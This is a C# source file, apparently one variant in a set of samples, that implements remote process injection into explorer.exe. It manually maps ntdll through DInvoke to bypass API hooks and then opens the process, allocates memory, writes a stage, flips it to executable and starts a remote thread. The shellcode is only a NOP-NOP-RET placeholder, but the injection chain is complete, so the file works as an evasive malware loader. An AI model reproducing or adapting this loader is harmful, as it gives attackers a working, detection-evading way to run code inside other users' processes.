using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

// Variant: renamed identifiers, explorer target lookup, direct DInvoke
// mapped-module calls (no wrapper class), payload under a different name.
namespace ExplorerPatchResearch
{
    public static class Loader
    {
        public static void Run()
        {
            byte[] stage = new byte[] { 0x90, 0x90, 0xC3 };
            string encodedStage = System.Convert.ToBase64String(stage);
            byte[] decodedStage = System.Convert.FromBase64String(encodedStage);

            var mapped = DInvoke.ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");

            var candidates = Process.GetProcessesByName("explorer");
            if (candidates.Length == 0)
            {
                Console.WriteLine("[-] target not running");
                return;
            }
            IntPtr chosenPid = (IntPtr)candidates[0].Id;

            var objAttr = new DInvoke.Data.Native.OBJECT_ATTRIBUTES();
            var clientId = new DInvoke.Data.Native.CLIENT_ID
            {
                UniqueProcess = chosenPid
            };

            object[] openParams = {
                IntPtr.Zero,
                DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                objAttr,
                clientId
            };
            uint status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(
                mapped.PEINFO,
                mapped.ModuleBase,
                "NtOpenProcess",
                typeof(DynamicInvoke.Native.DELEGATES.NtOpenProcess),
                ref openParams,
                false);
            IntPtr remoteHandle = (IntPtr)openParams[0];

            IntPtr remoteBase = IntPtr.Zero;
            IntPtr zeroBits = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)decodedStage.Length;
            object[] allocParams = {
                remoteHandle,
                remoteBase,
                zeroBits,
                regionSize,
                DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE,
                (uint)0x04
            };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(
                mapped.PEINFO,
                mapped.ModuleBase,
                "NtAllocateVirtualMemory",
                typeof(DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory),
                ref allocParams,
                false);
            remoteBase = (IntPtr)allocParams[1];

            IntPtr localCopy = Marshal.AllocHGlobal(decodedStage.Length);
            Marshal.Copy(decodedStage, 0, localCopy, decodedStage.Length);
            uint written = 0;
            object[] writeParams = {
                remoteHandle,
                remoteBase,
                localCopy,
                (uint)decodedStage.Length,
                written
            };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(
                mapped.PEINFO,
                mapped.ModuleBase,
                "NtWriteVirtualMemory",
                typeof(DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory),
                ref writeParams,
                false);

            uint oldProtect = 0;
            object[] protectParams = { remoteHandle, remoteBase, regionSize, (uint)0x20, oldProtect };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(
                mapped.PEINFO,
                mapped.ModuleBase,
                "NtProtectVirtualMemory",
                typeof(DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory),
                ref protectParams,
                false);

            object[] threadParams = {
                IntPtr.Zero,
                DInvoke.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                remoteHandle,
                remoteBase,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
            };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(
                mapped.PEINFO,
                mapped.ModuleBase,
                "NtCreateThreadEx",
                typeof(DynamicInvoke.Native.DELEGATES.NtCreateThreadEx),
                ref threadParams,
                false);
            Console.WriteLine("[*] remote thread started");
        }
    }
}
